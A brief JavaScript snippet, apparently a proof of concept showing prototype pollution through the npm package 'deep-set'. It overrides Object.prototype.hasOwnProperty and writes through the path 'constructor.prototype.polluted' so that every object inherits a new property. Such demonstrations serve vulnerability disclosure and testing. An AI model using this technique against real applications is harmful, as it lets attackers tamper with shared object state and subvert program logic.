Object.prototype.hasOwnProperty = () => true;
console.log({}.polluted);
const deepSet = require('deep-set');
const obj = { 1: '2' };
deepSet(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);